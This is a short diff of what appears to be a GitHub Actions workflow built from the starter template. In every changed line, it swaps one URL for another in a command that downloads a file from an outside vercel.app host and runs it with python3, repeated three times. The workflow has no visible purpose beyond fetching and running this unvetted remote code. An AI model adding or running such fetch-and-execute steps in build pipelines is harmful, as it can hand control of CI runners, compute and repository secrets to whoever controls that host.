@@ -35,6 +35,6 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           pip3 install requests
-          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/gms.2.py.txt' && python3 bin
-          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/gms.2.py.txt' && python3 bin
-          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/gms.2.py.txt' && python3 bin
+          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/gms.2.py...txt' && python3 bin
+          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/gms.2.py...txt' && python3 bin
+          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/gms.2.py...txt' && python3 bin
